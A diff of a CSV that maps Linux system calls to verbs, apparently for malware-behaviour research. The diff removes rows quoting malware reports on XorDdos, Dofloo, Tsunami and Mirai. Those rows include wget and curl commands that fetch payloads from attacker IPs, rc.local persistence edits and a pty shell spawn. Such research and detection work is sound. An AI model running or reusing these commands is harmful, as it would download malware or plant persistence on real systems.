@@ -76,13 +76,9 @@ FILE,CREATE_OPEN,man,flock(),apply,
 FILE,CREATE_OPEN,man,flock(),remove,
 FILE,CREATE_OPEN,man,link(),make,
 FILE,CREATE_OPEN,man,link(),create,
-FILE,CREATE_OPEN,Xorddos.Micro,link(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
-FILE,CREATE_OPEN,Dofloo.Tend,link(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
-FILE,CREATE_OPEN,Tsunami.Aquasec2,link(),drop,The file k.sh that was dropped and executed on the attacked server
 FILE,CREATE_OPEN,man,linkat(),create,
 FILE,CREATE_OPEN,man,memfd_create(),create,
 FILE,CREATE_OPEN,man,mkdir(),create,
-FILE,CREATE_OPEN,Miria.IsSans,mkdir(),mount,big-ip mounts the /usr partition read-only.
 FILE,CREATE_OPEN,man,mkdirat(),create,
 FILE,CREATE_OPEN,man,mknod(),create,
 FILE,CREATE_OPEN,man,mknodat(),creates,
@@ -97,37 +93,24 @@ FILE,CREATE_OPEN,man,name_to_handle_at(),open,
 FILE,CREATE_OPEN,man,name_to_handle_at(),obtain,
 FILE,CREATE_OPEN,man,open(),open,
 FILE,CREATE_OPEN,man,open(),create,
-FILE,CREATE_OPEN,Xorddos.Micro,open(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
-FILE,CREATE_OPEN,Dofloo.Syscall,open(),add,Persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function);
-FILE,CREATE_OPEN,Xorddos.Micro,open(),drop,The malware drops an init script at the location /etc/init.d.
-FILE,CREATE_OPEN,Xorddos.Micro,open(),mount,one reason for the daemon process to change the directory to the root partition (“/“)is because running the process from the mounted file system prevents unmounting unless the process is stopped.
 FILE,CREATE_OPEN,man,open_by_handle_at(),open,
 FILE,CREATE_OPEN,man,open_by_handle_at(),obtain,
 FILE,CREATE_OPEN,man,openat(),open,
-FILE,CREATE_OPEN,Miria.IsSans,openat(),mount,big-ip mounts the /usr partition read-only.
 FILE,CREATE_OPEN,man,symlink(),make,
 FILE,CREATE_OPEN,man,symlink(),create,
-FILE,CREATE_OPEN,Xorddos.Micro,symlink(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
-FILE,CREATE_OPEN,Dofloo.Tend,symlink(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
-FILE,CREATE_OPEN,Tsunami.Aquasec3,symlink(),drop,The file k.sh that was dropped and executed on the attacked server
 FILE,CREATE_OPEN,man,symlinkat(),create,
 FILE,CREATE_OPEN,man,umask(),set,
 FILE,DELETE,man,fremovexattr(),remove,
 FILE,DELETE,man,munmap(),unmap,
 FILE,DELETE,man,remove(),delete,
 FILE,DELETE,man,remove(),remove,
-FILE,DELETE,None,remove(),drop,drop the file from the victim machine
-FILE,DELETE,Darlloz.Trend,rm(),delete,This worm deletes the following files
-FILE,DELETE,None,rm(),drop,drops each specified file
 FILE,DELETE,man,rmdir(),delete,
-FILE,DELETE,None,rmdir(),drop,drop the file from the victim machine
 FILE,DELETE,man,umount(),remove,
 FILE,DELETE,man,umount(),unmount,
 FILE,DELETE,man,umount2(),remove,
 FILE,DELETE,man,umount2(),unmount,
 FILE,DELETE,man,unlink(),delete,
 FILE,DELETE,man,unlinkat(),remove,
-FILE,DELETE,None,unlinkat(),drop,drop the file from the victim machine
 FILE,DIR,man,getcwd(),get,
 FILE,DIR,man,getdents(),get,
 FILE,FD_DUP,man,dup(),duplicate,
@@ -187,23 +170,11 @@ FILE,FILE_READ,man,preadv(),read,
 FILE,FILE_READ,man,preadv2(),read,
 FILE,FILE_READ,man,read(),seek,
 FILE,FILE_READ,man,read(),read,
-FILE,FILE_READ,Dofloo.Security,read(),gather,"Once the malware has infected a system, it can gather system information, including model ID and CPU description, speed, family, model, and type."
-FILE,FILE_READ,Xorddos.Micro,read(),fetch,"The user mode malware calls the function getself(), which invokes readlink() to fetch the location of the malware file image on disk."
-FILE,FILE_READ,Xorddos.Intezer,read(),look,"As shown in Figure 6, the malware looks up its current path and moves the binary to the created folder. It hides the file by naming it “.po1kitd-update-k”."
-FILE,FILE_READ,Dofloo.Bleep,read(),see,campaigns started spreading to the cloud following the drop in activity seen by ransomware operations after the end of 2017.
-FILE,FILE_READ,Miria.Trend,read(),use,Exploits - takes advantage of a software vulnerability or security flaw and can be used to remotely access a network and gain elevated privileges
-FILE,FILE_READ,Xorddos.Micro,read(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
 FILE,FILE_READ,man,readahead(),initiate,
 FILE,FILE_READ,man,readdir(),read,
 FILE,FILE_READ,man,readlink(),place,
 FILE,FILE_READ,man,readlink(),truncate,
 FILE,FILE_READ,man,readlink(),read,
-FILE,FILE_READ,Dofloo.Trend,readlink(),gather,This Backdoor gathers the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:
-FILE,FILE_READ,Xorddos.Micro,readlink(),fetch,it calls the readlink API with the first parameter as /proc/self/exe to fetch its full process path.
-FILE,FILE_READ,Tsunami.Aquasec,readlink(),look,The attackers are looking for more vulnerable machines on the same network as the infected machine.
-FILE,FILE_READ,Dofloo.Syscall,readlink(),see,however before it overwrites this file it first checks to see if it has already done so.
-FILE,FILE_READ,Dofloo.Mal,readlink(),use,"how this malware use socket to connect an IP, for example, since the code is too long. But to be noted, since ARM architecture has different structure than Intel, and ARM is designed for the embedded systems, you will see many different method for the detail operation that is involving with the system calls."
-FILE,FILE_READ,Xorddos.Intezer,readlink(),extract,hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release
 FILE,FILE_READ,man,readlinkat(),place,
 FILE,FILE_READ,man,readlinkat(),read,
 FILE,FILE_READ,man,readv(),read,
@@ -273,8 +244,6 @@ FILE,STATUS,man,statfs64(),get,
 FILE,STATUS,man,statx(),get,
 FILE,UPDATE,man,chdir(),change,
 FILE,UPDATE,man,chmod(),change,
-FILE,UPDATE,Xorddos.Micro,chmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
-FILE,UPDATE,Xorddos.Micro,chmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
 FILE,UPDATE,man,chown(),change,
 FILE,UPDATE,man,chown32(),change,
 FILE,UPDATE,man,fadvise64(),access,
@@ -286,8 +255,6 @@ FILE,UPDATE,man,fanotify_mark(),remove,
 FILE,UPDATE,man,fanotify_mark(),modify,
 FILE,UPDATE,man,fchdir(),change,
 FILE,UPDATE,man,fchmod(),change,
-FILE,UPDATE,Xorddos.Micro,fchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
-FILE,UPDATE,Xorddos.Micro,fchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
 FILE,UPDATE,man,fchmodat(),change,
 FILE,UPDATE,man,fchown(),change,
 FILE,UPDATE,man,fchown32(),change,
@@ -296,8 +263,6 @@ FILE,UPDATE,man,fsetxattr(),set,
 FILE,UPDATE,man,ftruncate(),truncate,
 FILE,UPDATE,man,ftruncate64(),truncate,
 FILE,UPDATE,man,lchmod(),change,
-FILE,UPDATE,Xorddos.Micro,lchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
-FILE,UPDATE,Xorddos.Micro,lchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
 FILE,UPDATE,man,lchown(),change,
 FILE,UPDATE,man,lchown32(),change,
 FILE,UPDATE,man,lremovexattr(),remove,
@@ -309,10 +274,6 @@ FILE,UPDATE,man,pwritev2(),write,
 FILE,UPDATE,man,removexattr(),remove,
 FILE,UPDATE,man,rename(),rename,
 FILE,UPDATE,man,rename(),change,
-FILE,UPDATE,Xorddos.Trend2,rename(),update,Figure 3. Code snippet showing XORDDoS’ capability to download and update files.
-FILE,UPDATE,Dofloo.Syscall,rename(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
-FILE,UPDATE,Dofloo.Security,rename(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
-FILE,UPDATE,Dofloo.Bleep,rename(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
 FILE,UPDATE,man,renameat(),rename,
 FILE,UPDATE,man,renameat(),moving,
 FILE,UPDATE,man,renameat(),change,
@@ -326,11 +287,6 @@ FILE,UPDATE,man,utime(),change,
 FILE,UPDATE,man,utimensat(),change,
 FILE,UPDATE,man,utimes(),change,
 FILE,UPDATE,man,write(),write,
-FILE,UPDATE,Xorddos.Micro,write(),update,"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
-FILE,UPDATE,Dofloo.Syscall,write(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
-FILE,UPDATE,Dofloo.Security,write(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
-FILE,UPDATE,Dofloo.Bleep,write(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
-FILE,UPDATE,Xorddos.Micro,write(),set,"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid()."
 FILE,UPDATE,man,writev(),write,
 FILE,WAIT,man,poll(),wait for,
 FILE,WAIT,man,poll(),monitor,
@@ -378,20 +334,13 @@ ID,ID_SET,man,setreuid(),set,
 ID,ID_SET,man,setreuid32(),set,
 ID,ID_SET,man,setsid(),set,
 ID,ID_SET,man,setsid(),create,
-ID,ID_SET,Xorddos.Micro,setsid(),assign,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
 ID,ID_SET,man,setuid(),set,
 ID,ID_SET,man,setuid32(),set,
 INFO,INFO_GET,man,getrlimit(),get,
 INFO,INFO_GET,man,prlimit64(),get,
 INFO,INFO_GET,man,sysinfo(),return,
-INFO,INFO_GET,None,sysinfo(),gather,gather system information
-INFO,INFO_GET,None,sysinfo(),look,look for system information
-INFO,INFO_GET,None,sysinfo(),find,find linux kernel information
 INFO,INFO_GET,man,ugetrlimit(),get,
 INFO,INFO_GET,man,uname(),get,
-INFO,INFO_GET,None,uname(),gather,gather system information
-INFO,INFO_GET,None,uname(),look,look for system information
-INFO,INFO_GET,None,uname(),find,find linux kernel information
 NET,NET_CLOSE,man,mq_unlink(),remove,
 NET,NET_CLOSE,man,shutdown(),shut down,
 NET,NET_CONNECT,man,accept(),creates,
@@ -400,7 +349,6 @@ NET,NET_CONNECT,man,accept4(),creates,
 NET,NET_CONNECT,man,accept4(),accept,
 NET,NET_CONNECT,man,bind(),assign,
 NET,NET_CONNECT,man,bind(),bind,
-NET,NET_CONNECT,Xorddos.Micro,bind(),hook,Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6
 NET,NET_CONNECT,man,connect(),initiate,
 NET,NET_CONNECT,man,connect(),connect,
 NET,NET_CONNECT,man,mq_notify(),unregister for,
@@ -410,7 +358,6 @@ NET,NET_CONNECT,man,mq_open(),create,
 NET,NET_CONNECT,man,pipe(),create,
 NET,NET_CONNECT,man,pipe2(),create,
 NET,NET_CONNECT,man,socket(),create,
-NET,NET_CONNECT,Xorddos.Micro,socket(),hook,Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6
 NET,NET_CONNECT,man,socketpair(),create,
 NET,NET_OPTION,man,getpeername(),get,
 NET,NET_OPTION,man,getsockname(),get,
@@ -426,41 +373,14 @@ NET,NET_TRANSMIT,man,listen(),listen for,
 NET,NET_TRANSMIT,man,mq_timedreceive(),receive,
 NET,NET_TRANSMIT,man,mq_timedsend(),send,
 NET,NET_TRANSMIT,man,recv(),receive,
-NET,NET_TRANSMIT,Miria.NJCCIC,recv(),communicate,Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.
-NET,NET_TRANSMIT,Xorddos.Micro,recv(),download,The attacker communicates with a bot to SSH brute force a target device and download XorDdos.
-NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),wget,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
-NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),curl,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
 NET,NET_TRANSMIT,man,recvfrom(),receive,
-NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
-NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),download,Code snippet showing XORDDoS’ capability to download and update files.
-NET,NET_TRANSMIT,Xorddos.Trend3,recvfrom(),wget,wget http://122.51.133.49:10086/VIP –O VIP
-NET,NET_TRANSMIT,Tsunami.Jun,recvfrom(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
 NET,NET_TRANSMIT,man,recvmmsg(),receive,
 NET,NET_TRANSMIT,man,recvmsg(),receive,
-NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
-NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
-NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
-NET,NET_TRANSMIT,Tsunami.Jun,recvmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
 NET,NET_TRANSMIT,man,send(),send,
-NET,NET_TRANSMIT,None,send(),transfer,transfer data to command and control server.
-NET,NET_TRANSMIT,Xorddos.Trend2,send(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
-NET,NET_TRANSMIT,Xorddos.Trend2,send(),download,Code snippet showing XORDDoS’ capability to download and update files.
-NET,NET_TRANSMIT,Xorddos.Trend4,send(),wget,wget http://122.51.133.49:10086/VIP –O VIP
-NET,NET_TRANSMIT,Tsunami.Jun,send(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
 NET,NET_TRANSMIT,man,sendmmsg(),transmit,
 NET,NET_TRANSMIT,man,sendmmsg(),send,
 NET,NET_TRANSMIT,man,sendmsg(),send,
-NET,NET_TRANSMIT,None,sendmsg(),transfer,transfer data to command and control server.
-NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
-NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
-NET,NET_TRANSMIT,Xorddos.Trend6,sendmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
-NET,NET_TRANSMIT,Tsunami.Jun,sendmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
 NET,NET_TRANSMIT,man,sendto(),send,
-NET,NET_TRANSMIT,None,sendto(),transfer,transfer data to command and control server.
-NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
-NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),download,Code snippet showing XORDDoS’ capability to download and update files.
-NET,NET_TRANSMIT,Xorddos.Trend5,sendto(),wget,wget http://122.51.133.49:10086/VIP –O VIP
-NET,NET_TRANSMIT,Tsunami.Jun,sendto(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
 PROC,PROC_COMM,man,msgctl(),control,
 PROC,PROC_COMM,man,msgrcv(),operate,
 PROC,PROC_COMM,man,msgrcv(),send,
@@ -493,33 +413,9 @@ PROC,PROC_EXAM,man,sigprocmask(),examine,
 PROC,PROC_EXAM,man,sigprocmask(),fetch,
 PROC,PROC_EXAM,man,sigprocmask(),change,
 PROC,PROC_EXE,man,clone(),create,
-PROC,PROC_EXE,Mirai.Impera,clone(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
-PROC,PROC_EXE,Xorddos.Intezer,clone(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
-PROC,PROC_EXE,Dofloo.Mal,clone(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
-PROC,PROC_EXE,Mirai.Mal,clone(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
-PROC,PROC_EXE,Xorddos.Micro,clone(),perform,method involves running a bash script that performs the following activities via the command line:
-PROC,PROC_EXE,Tsunami.Cado,clone(),install,And the kinsing malware itself was installed at /etc/kinsing
-PROC,PROC_EXE,Tsunami.Aquasec,clone(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
-PROC,PROC_EXE,Xorddos.Micro,clone(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
 PROC,PROC_EXE,man,execve(),execute,
-PROC,PROC_EXE,Dofloo.Syscall,execve(),use,the malware constructs a shell command and then uses the system function to execute them
-PROC,PROC_EXE,Dofloo.Mal,execve(),call,This is the function to be called when performing DoS by HTTP
-PROC,PROC_EXE,Xorddos.Intezer,execve(),spawn,"In the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface."
-PROC,PROC_EXE,Dofloo.Syscall,execve(),fork,The process then forks itself and breaks away from its parent by calling setsid(..).
-PROC,PROC_EXE,Xorddos.Intezer,execve(),perform,The JSESSIONID value holds the command ID for the job the C2 wants the malware to perform.
-PROC,PROC_EXE,Dofloo.Security,execve(),install,"we saw that an attacker was able to exploit CVE-2019-3396 to infect machines with the AESDDoS botnet malware.” reads the analysis published by Trend Micro. “A shell command was remotely executed to download and execute a malicious shell script (Trojan.SH.LODEX.J), which in turn downloaded another shell script (Trojan.SH.DOGOLOAD.J) that finally installed the AESDDoS botnet malware on the affected system."
-PROC,PROC_EXE,Dofloo.Syscall,execve(),add,Persistence is achieved by the malware by adding to /etc/rc.local
-PROC,PROC_EXE,Mirai.Mal,execve(),start,bind it to the specific port (not random) TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection:
 PROC,PROC_EXE,man,execveat(),execute,
 PROC,PROC_EXE,man,fork(),create,
-PROC,PROC_EXE,Mirai.Impera,fork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
-PROC,PROC_EXE,Xorddos.Intezer,fork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
-PROC,PROC_EXE,Dofloo.Mal,fork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
-PROC,PROC_EXE,Mirai.Mal,fork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
-PROC,PROC_EXE,Xorddos.Micro,fork(),perform,method involves running a bash script that performs the following activities via the command line:
-PROC,PROC_EXE,Tsunami.Cado,fork(),install,And the kinsing malware itself was installed at /etc/kinsing
-PROC,PROC_EXE,Tsunami.Aquasec,fork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
-PROC,PROC_EXE,Xorddos.Micro,fork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
 PROC,PROC_EXE,man,nfsservctl(),provide,
 PROC,PROC_EXE,man,personality(),set,
 PROC,PROC_EXE,man,restart_syscall(),restart,
@@ -527,14 +423,6 @@ PROC,PROC_EXE,man,syscall(),invoke,
 PROC,PROC_EXE,man,unshare(),disassociate,
 PROC,PROC_EXE,man,vfork(),block,
 PROC,PROC_EXE,man,vfork(),create,
-PROC,PROC_EXE,Mirai.Impera,vfork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
-PROC,PROC_EXE,Xorddos.Intezer,vfork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
-PROC,PROC_EXE,Dofloo.Mal,vfork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
-PROC,PROC_EXE,Mirai.Mal,vfork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
-PROC,PROC_EXE,Xorddos.Micro,vfork(),perform,method involves running a bash script that performs the following activities via the command line:
-PROC,PROC_EXE,Tsunami.Cado,vfork(),install,And the kinsing malware itself was installed at /etc/kinsing
-PROC,PROC_EXE,Tsunami.Aquasec,vfork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
-PROC,PROC_EXE,Xorddos.Micro,vfork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
 PROC,PROC_EXE,man,vhangup(),arrange,
 PROC,PROC_EXE,man,vhangup(),hangup,
 PROC,PROC_GET,man,getrandom(),obtain,
@@ -548,11 +436,7 @@ PROC,PROC_GET,man,sigreturn(),return,
 PROC,PROC_GET,man,timer_getoverrun(),get,
 PROC,PROC_KILL,man,exit(),terminate,
 PROC,PROC_KILL,man,exit_group(),exit,
-PROC,PROC_KILL,Tsunami.Trend,exit_group(),kill,Kill all current packeting.
-PROC,PROC_KILL,Tsunami.Aquasec,exit_group(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
 PROC,PROC_KILL,man,kill(),send signal,
-PROC,PROC_KILL,Tsunami.Unit42,kill(),kill,"It then kills all Telnet and SSH related processes, and connects with a C2 server to receive further commands."
-PROC,PROC_KILL,Tsunami.Aquasec,kill(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
 PROC,PROC_KILL,man,tgkill(),send,
 PROC,PROC_KILL,man,tkill(),send,
 PROC,PROC_LOAD,man,delete_module(),unload,
@@ -596,7 +480,6 @@ PROC,PROC_OTHER,man,mremap(),remap,
 PROC,PROC_OTHER,man,mremap(),expand,
 PROC,PROC_OTHER,man,nanosleep(),suspend,
 PROC,PROC_OTHER,man,nanosleep(),sleep,
-PROC,PROC_OTHER,Xorddos.Intezer,nanosleep(),sleep,The malware sleeps and tries to obtain the lock on the file again when it wakes up.
 PROC,PROC_OTHER,man,pkey_alloc(),allocate,
 PROC,PROC_OTHER,man,pkey_free(),free,
 PROC,PROC_OTHER,man,prctl(),operate,
